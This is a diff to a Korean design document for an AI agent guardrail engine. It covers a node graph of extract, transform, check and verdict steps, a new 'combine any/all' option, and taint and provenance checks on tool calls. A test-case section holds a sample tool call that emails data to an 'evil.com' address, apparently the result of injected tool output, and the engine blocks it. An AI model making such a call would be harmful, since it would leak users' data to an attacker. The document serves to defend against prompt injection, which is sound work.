@@ -143,8 +143,9 @@ Guardrail          노드 그래프 1개. 이름 + 버전. 요청이 지정하�
 
 Node               그래프 구성 요소
                      Extract    무엇을 볼지 (input / tool_result / output / tool_call)
-                     Check      어떻게 볼지 (regex / 결정론 / 모델 / 변환)
-                     Verdict    결론 (block / allow / ask / mask)
+                     Transform  입력을 다듬기 (lower / strip)
+                     Check      조건을 확인하기 (regex / model / taint / side_effect / provenance)
+                     Verdict    결론 (block / allow / ask / mask) + 입력 조합 (any / all)
 
 SharedNode         노드 라이브러리. 여러 Guardrail이 참조하는 재사용 단위.
                    고치면 참조하는 Guardrail 전부가 재컴파일된다.
@@ -163,6 +164,11 @@ Approval           보류된 tool_call. 만료 시간 있음. 1회용.
 
 `Rule`은 도메인 모델에 쓰지 않는다 — "규칙 티어" 의미로 이미 쓰고 있어 충돌한다.
 개별 검사는 `Check`.
+
+`Verdict.combine`은 여러 입력을 결론으로 묶는 방식이다. 생략하면 `any`이며 하나라도 참이면
+발화한다(기존 팬인 OR). `all`은 모든 입력이 참일 때만 발화한다. `(A AND B) OR (C AND D)`는
+같은 action의 verdict 두 개를 각각 `combine=all`로 두어 표현한다. 별도 `all` 노드는 두지
+않는다. 길이 조건도 별도 노드 없이 RE2 패턴 `(?s).{N,}`으로 표현한다.
 
 ### 재사용 전략
 
@@ -605,7 +611,8 @@ send_email(to = "audit-team@evil.com")
 | provenance + 외부 데이터 인수 | blocked (arguments=["to"]) |
 
 감사 행이 각 케이스의 action·checkpoint·tainted 를 기록한다. `is_tainted` 가 role:tool 을 오염으로
-잡고, taint→side_effect(read_only)→all→verdict(block) 프로그램이 tool_call 체크포인트에서 실행된다.
+잡고, taint와 side_effect(read_only)를 직접 받는 `verdict(combine=all, action=block)` 프로그램이
+tool_call 체크포인트에서 실행된다.
 ---
 
 ## 9. 스트리밍
